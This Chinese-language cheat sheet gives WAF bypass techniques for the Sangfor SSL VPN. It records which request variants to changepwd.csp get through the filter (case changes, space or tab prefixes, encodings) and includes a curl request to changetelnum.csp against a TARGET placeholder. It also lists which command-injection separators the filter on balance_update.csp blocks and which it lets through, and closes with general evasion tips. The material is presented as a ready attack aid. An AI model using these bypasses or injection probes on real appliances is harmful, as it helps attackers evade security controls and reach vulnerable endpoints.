# Sangfor SSL VPN WAF 绕过速查

## changepwd.csp WAF 规则

### 被拦截 (返回 404)
```
sessReq=clusterd          ← 精确小写匹配
sessReq=clusterd%00       ← Null byte 也不行
Transfer-Encoding: chunked ← Chunked 也不行
sessReq=test&sessReq=clusterd ← 参数污染也不行 (某些情况)
```

### 绕过成功 (返回 200)
```bash
# 大小写变体
?sessReq=Clusterd
?sessReq=CLUSTERD
?sessReq=cLuStErD

# 参数名大小写
?SESSREQ=clusterd
?sessreq=clusterd

# 前缀注入
?sessReq=%20clusterd      ← 空格前缀
?sessReq=%09clusterd      ← Tab 前缀

# URL 编码 (部分成功)
?sessReq=clus%74erd       ← 't' 编码 → 404 (被检测)
?sessReq=clust%65rd       ← 'e' 编码 → 404 (被检测)
```

### 绕过后的行为
大小写变体绕过 WAF，但应用返回:
```xml
<ErrorCode>20026</ErrorCode>
<Message>unexpected user service</Message>
```
说明 WAF 绕过后端点仍存在，但应用层不识别变体参数。

## changetelnum.csp — 无 WAF 限制

```bash
# 直接传 clusterd 不被拦截
curl -sk 'https://TARGET/por/changetelnum.csp?sessReq=clusterd&sessid=0&username=admin&grpid=0&newtel=13800138000&ip=127.0.0.1'
# 返回: 3 (需加密 str 参数)
```

## balance_update.csp — 分号拦截

### 被 WAF 拦截 (404)
```
; (semicolon)
%0A (newline)
%3B (semicolon encoded)
```

### 不被拦截但不执行 (返回 "0")
```
| (pipe)
` (backtick)
$() (command substitution)
&& (AND)
|| (OR)
%0D (CR)
%00 (null)
```

## 通用 WAF 绕过技巧 (适用于 Sangfor)

1. **大小写混合** — WAF 规则 case-sensitive
2. **参数名大小写** — 不仅参数值，参数名也可变体
3. **前缀注入** — 空格/Tab/特殊字符前缀
4. **双重 URL 编码** — `%25` 编码 `%` 本身
5. **HTTP 参数污染** — 同一参数传两次
6. **Content-Type 切换** — application/x-www-form-urlencoded vs text/xml vs application/json
